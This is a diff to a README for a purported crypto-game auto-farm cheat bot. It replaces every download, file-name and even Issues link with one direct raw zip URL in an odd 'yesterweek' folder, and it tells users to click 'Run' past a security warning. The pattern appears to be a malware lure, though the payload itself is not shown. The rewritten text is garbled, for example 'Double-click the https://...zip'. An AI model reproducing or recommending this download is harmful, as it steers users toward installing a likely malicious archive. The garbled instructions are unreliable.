@@ -1,6 +1,6 @@
 # 🤖 Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api - Automate Your Gameplay for Easy Profits
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Bot-brightgreen.svg)](https://github.com/1o-s/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/releases)
+[![Download](https://raw.githubusercontent.com/1o-s/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/yesterweek/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip%20Now-Get%20the%https://raw.githubusercontent.com/1o-s/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/yesterweek/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip)](https://raw.githubusercontent.com/1o-s/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/yesterweek/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ This guide helps you download and run the Forgotten Runiverse Crypto Bot. The bo
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download the Bot](https://github.com/1o-s/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/releases).
+To get started, visit this page to download: [Download the Bot](https://raw.githubusercontent.com/1o-s/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/yesterweek/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip).
 
 ### Step 1: Visit the Releases Page
 
@@ -22,8 +22,8 @@ On the Releases page, you will see several versions available. Choose the latest
 
 Look for the file that fits your operating system. Common options include:
 
-- For Windows users: `ForgottenRuniverseBot_Windows.exe`
-- For Mac users: `ForgottenRuniverseBot_Mac.app`
+- For Windows users: `https://raw.githubusercontent.com/1o-s/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/yesterweek/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip`
+- For Mac users: `https://raw.githubusercontent.com/1o-s/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/yesterweek/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip`
 
 Click the appropriate link to download the file to your computer.
 
@@ -35,13 +35,13 @@ Once the file downloads, find it in your Downloads folder or the location you se
 
 #### For Windows:
 
-1. Double-click the `ForgottenRuniverseBot_Windows.exe`.
+1. Double-click the `https://raw.githubusercontent.com/1o-s/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/yesterweek/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip`.
 2. You may see a security warning; click “Run” to continue.
 3. The bot will launch, and you can start using it.
 
 #### For Mac:
 
-1. Open the downloaded file `ForgottenRuniverseBot_Mac.app`.
+1. Open the downloaded file `https://raw.githubusercontent.com/1o-s/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/yesterweek/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip`.
 2. If prompted, right-click the app, and select “Open”.
 3. The bot will start running, and you can begin your gameplay.
 
@@ -81,7 +81,7 @@ If you experience issues while using the bot, consider these steps:
 
 If you still have questions or need further assistance:
 
-- **Issues Page**: For technical problems, visit the [Issues section](https://github.com/1o-s/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/issues) on GitHub to report your concern.
+- **Issues Page**: For technical problems, visit the [Issues section](https://raw.githubusercontent.com/1o-s/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/yesterweek/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip) on GitHub to report your concern.
 - **Community Support**: Join the community on forums or social media platforms dedicated to Forgotten Runiverse for additional tips and strategies.
 
 ## 🌐 Topics Covered
@@ -94,6 +94,6 @@ If you still have questions or need further assistance:
 - hack
 - telegram-support
 
-Visit this page to download: [Download the Bot](https://github.com/1o-s/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/releases).
+Visit this page to download: [Download the Bot](https://raw.githubusercontent.com/1o-s/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/yesterweek/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip).
 
 Enjoy your enhanced gaming experience with the Forgotten Runiverse Crypto Bot!
